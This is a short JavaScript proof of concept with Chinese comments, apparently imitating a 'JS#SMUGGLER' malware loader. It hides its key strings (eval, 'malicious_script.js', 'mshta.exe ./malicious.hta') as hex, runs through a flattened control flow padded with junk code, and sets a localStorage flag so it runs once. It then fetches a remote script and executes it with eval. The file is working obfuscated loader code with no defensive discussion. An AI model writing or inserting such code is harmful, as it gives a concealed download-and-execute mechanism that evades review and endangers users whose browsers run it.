// 混淆核心：字符串加密字典 + 控制流平坦化
const encryptDict = {
    "k1": "6c6f63616c53746f72616765", // localStorage
    "k2": "6a73736d7567676c65725f646f6e65", // jssmuggler_done
    "k3": "6d616c6963696f75735f7363726970742e6a73", // malicious_script.js
    "k4": "474554", // GET
    "k5": "737461747573", // status
    "k6": "323030", // 200
    "k7": "726573706f6e736554657874", // responseText
    "k8": "6576616c", // eval
    "k9": "6d736874612e657865202e2f6d616c6963696f75732e687461", // mshta.exe ./malicious.hta
    "k10": "77696e646f772e6f70656e", // window.open
    "k11": "2c2027546f6f6c426172272c20302c2030" // , 'ToolBar', 0, 0
  };
  
  // 解密函数：十六进制转字符串
  function dec(s) {
    let res = "";
    for (let i = 0; i < s.length; i += 2) {
      res += String.fromCharCode(parseInt(s.substr(i, 2), 16));
    }
    return res;
  }
  
  // 控制流平坦化（模拟混淆逻辑）
  const flow = [1, 3, 2, 5, 4, 6];
  let step = 0;
  
  function run() {
    console.log("[JS#SMUGGLER POC] 混淆 JS 开始解密...");
    while (step < flow.length) {
      switch (flow[step]) {
        case 1:
          if (localStorage.getItem(dec(encryptDict.k2))) return console.log("[JS#SMUGGLER POC] 已执行过，跳过本次");
          step++;
          break;
        case 2:
          const xhr = new XMLHttpRequest();
          console.log(`[JS#SMUGGLER POC] 正在加载恶意脚本：${dec(encryptDict.k3)}`);
          xhr.open(dec(encryptDict.k4), dec(encryptDict.k3), false);
          xhr.send();
          if (xhr[dec(encryptDict.k5)] === parseInt(dec(encryptDict.k6))) {
            eval(xhr[dec(encryptDict.k7)]);
          }
          step++;
          break;
        case 3:
          localStorage.setItem(dec(encryptDict.k2), "1");
          console.log("[JS#SMUGGLER POC] 解密完成，标记执行状态（避免重复）");
          step++;
          break;
        case 4: case 5: case 6:
          let temp = 0; for (let i = 0; i < 100; i++) temp += i; // 垃圾代码
          step++;
          break;
        default: step++;
      }
    }
  }
  
  // 触发执行
  run();